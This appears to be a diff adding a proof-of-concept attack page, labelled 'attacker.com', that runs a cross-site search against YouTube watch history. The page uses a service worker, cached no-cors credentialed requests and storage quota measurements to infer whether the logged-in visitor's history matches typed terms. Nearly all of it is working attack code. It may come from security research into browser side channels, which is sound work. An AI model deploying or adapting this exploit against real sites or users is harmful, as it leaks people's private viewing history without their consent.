@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>XS-Search</title>
+
+  <script>
+
+var logString = "";
+
+String.prototype.replaceAll = function(search, replace)
+{
+    //if replace is null, return original string otherwise it will
+    //replace search string with 'undefined'.
+    if(!replace) 
+        return this;
+
+    return this.replace(new RegExp('[' + search + ']', 'g'), replace);
+};
+
+function addToLogString(logStr)
+{
+	logString += logStr;
+	var ddd = document.createElement("div");
+	ddd.innerHTML = logStr.replaceAll("\n","<br>")
+	document.body.appendChild(ddd);
+}
+  
+var CACHE_NAME = 'CACHE';
+  
+function randomString(len)
+{
+    text = "";
+    possible = "abcdefghijklmnopqrstuvwxyz";
+	numberOfCharacters = possible.length;
+	
+    for( var i=0; i < len; i++ )
+        text += possible.charAt(Math.floor(Math.random() * numberOfCharacters));
+
+    return text;
+}
+
+
+function takeSecondSizeMeasurement() {
+	navigator.webkitTemporaryStorage.queryUsageAndQuota(function(quota, usage) {
+		secondSizeMeasurement = quota;
+		tempSize = secondSizeMeasurement - firstSizeMeasurement;
+		firstSizeMeasurement = secondSizeMeasurement;
+
+		console.log([tempSize, secondSizeMeasurement, firstSizeMeasurement]);
+		
+		if (dummyMeasurement)
+		{
+			if (tempSize != 0)
+			{
+				dummyMeasurement = false;	
+			}
+			measureSize();
+			return;
+		}
+		else if (tempSize == 0)// || (currentSetIndex > 0 && 1.95*Math.max.apply(null, namesRequestsDuration[currentSetIndex - 1]) + 5000 < tempSize))
+		{
+			dummyMeasurement = true;
+			measureSize();
+			return;
+		}
+		else
+		{
+			measurements.push(tempSize);
+			if (measurements.length == 2)
+			{
+				finishAttack();
+			}
+			else
+			{
+				url = dummyReq;
+				measureSize();
+			}	
+		}
+	});
+}
+
+
+var firstSizeMeasurement;
+var secondSizeMeasurement;
+
+
+function measureSize() 
+{
+	caches.match(new Request(url, {mode: 'no-cors', include: 'credentials'})).then(function(resp) {
+		if (resp == null) return;
+		caches.open("CACHE").then(function(cache){
+			cache.put(new Request("" + randStr + counter++, {mode: 'no-cors', include: 'credentials'}), resp.clone()).then(function(){
+				takeSecondSizeMeasurement();
+			});
+		});
+	});
+}
+
+function registerWorker()
+{
+	navigator.serviceWorker.register('k2.js').then(function(registration) {
+		// Registration was successful
+		console.log('ServiceWorker registration successful with scope: ',    registration.scope);
+		if (navigator.serviceWorker.controller) {
+			console.log('The service worker is currently handling network operations.');
+			document.getElementById("startButton").hidden = false;
+		} else {
+			console.log('Please reload this page to allow the service worker to handle network operations.');
+			if (document.location.search == "")
+				document.location.replace(document.location.href + "?0");
+				
+			return;
+		}		
+	}).catch(function(err) {
+		// registration failed :(
+		console.log('ServiceWorker registration failed: ', err);
+	});
+}
+
+function forceCacheUrls(urls) {
+	//updateStatus('Start downloading resources');
+	return new Promise(function(resolve) {
+		var messageChannel = new MessageChannel();
+		messageChannel.port1.onmessage = function(event) {
+			resolve();
+		};
+		navigator.serviceWorker.controller.postMessage({"action": "cacheAll", "urls": urls}, [messageChannel.port2]);
+	});
+}
+
+
+
+function startAttack()
+{
+	measurements = [];
+	dummyMeasurement = false;
+	randStr = randomString(5);
+	counter = 0;
+	attackStartTime = performance.now();
+	var basicReq = "https://www.youtube.com/feed/history?query=";
+	var query = encodeURI(document.getElementById("wordText").value);
+	challengeReq = basicReq + query;
+	dummyReq = basicReq + randomString(8) + query.replaceAll("OR","kk"); 
+
+	attackStartTime = performance.now();
+
+	forceCacheUrls([challengeReq, dummyReq]).then(function() {
+		navigator.webkitTemporaryStorage.queryUsageAndQuota(function(quota, usage) {
+			firstSizeMeasurement = quota;
+			secondSizeMeasurement = firstSizeMeasurement;
+			url = challengeReq;
+			measureSize();
+		});
+	});
+
+}
+
+function finishAttack()
+{
+	var str;
+	attackTime = performance.now() - attackStartTime;
+	var diff = measurements[0] - measurements[1];
+	var estimatedDiffPerResult = 4700;
+	if (diff > diffThreshold)
+	{
+		var estimatedResultsCounter = Math.min(Math.round(diff/estimatedDiffPerResult),20);
+		str = "There is at least one result for the tested search request.";
+		str += "<br>The estimated number of search results: " + estimatedResultsCounter;
+	}
+	else
+	{
+		str = "No search results were received for this search request.";
+	}
+	str += "<br>Attack was completed within " + (attackTime/1000) + " seconds";
+	document.getElementById("resultsDiv").innerHTML = str;
+}
+
+var dummyReq;
+var challengeReq;
+var diffThreshold = 4000;
+var url;
+
+
+</script>
+
+</head>
+
+<body onload="registerWorker();">
+<h1>Welcome to attacker.com!</h1>
+<h2>Use this form to cross-site search in Youtube watch history</h2>
+
+Type words/terms to test whether or not they appear in the watch history of the currently logged-in Youtube user:
+<br><input type="text" name="wordText" id="wordText" style="width:520px;" /><br>
+(You can use the OR operator for more complex queries)
+<br>
+<input type="button" id="startButton" value="Start attack" onclick="startAttack();" hidden="true" />
+<br>
+<br>
+<div id="resultsDiv"></div>
+</body>
+</html>
